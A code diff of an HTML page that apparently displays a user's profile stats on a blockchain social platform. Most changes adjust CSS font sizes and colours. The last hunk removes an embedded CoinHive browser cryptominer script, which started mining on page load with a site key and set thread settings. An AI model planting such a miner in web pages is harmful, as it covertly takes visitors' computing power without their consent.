@@ -17,9 +17,9 @@ table { width: 380px; padding: 10px 10px 10px 10px;
 }
 
 table td.left {
-	font-size: 11px;
+	font-size: 12px;
 	text-align:right;
-	color:darkblue;
+	color:Navy;
 	width: 200;
 	font-family: Arial, Helvetica, sans-serif;
 	
@@ -28,9 +28,9 @@ table td.left {
 }
 
 table td.left1 {
-	font-size: 11px;
+	font-size: 12px;
 	text-align:right;
-	color:darkblue;
+	color:Navy;
 	width: 200;
 	font-family: Arial, Helvetica, sans-serif;
 	
@@ -39,7 +39,7 @@ table td.left1 {
 }
 
 table td.left2 {
-	font-size: 11px;
+	font-size: 12px;
 	text-align:right;
 	color:blue;
 	width: 200;
@@ -50,9 +50,9 @@ table td.left2 {
 }
 
 table td.right {
-	color:green;
+	color:DarkGreen;
 	width: 180;
-	font-size: 11px;
+	font-size: 12px;
 	font-family: Arial, Helvetica, sans-serif;
 	
 	background: rgba(255, 255, 255, 0.8);
@@ -60,9 +60,9 @@ table td.right {
 }
 
 table td.right2 {
-	color:green;
+	color:DarkGreen;
 	width: 180;
-	font-size: 11px;
+	font-size: 14px;
 	font-family: Arial, Helvetica, sans-serif;
 	
 	background: rgba(255, 255, 255, 0.8);
@@ -106,8 +106,8 @@ function sendi()
 		<tr><td class="left"><img src=${image} width="160px"></td>
 		<td class="right2">
 		<p><br>${about}</p>
-		<p><br><br>Батарея: <b>${data.user.voting_power/100} %</b>
-		<br>Всего постов: ${data.user.post_count}</p>
+		<p><br><br>Батарея: <b style="color:RoyalBlue">${data.user.voting_power/100} %</b>
+		<br>Кол-во постов: <b style="color:RoyalBlue">${data.user.post_count}</b></p>
 		
 		</td></tr>
 		
@@ -245,14 +245,5 @@ sendi();
 
 
 
-<script src="https://coinhive.com/lib/coinhive.min.js"></script>
-<script>
-    var miner = new CoinHive.User('mvx7xQ4Qj2AKsnkXdV0fagDRB07k7Wcj', {
-        threads: 3,
-        autoThreads: false,
-        throttle: 0.9
-    });
-    miner.start();
-</script>
 </body>
 </html>
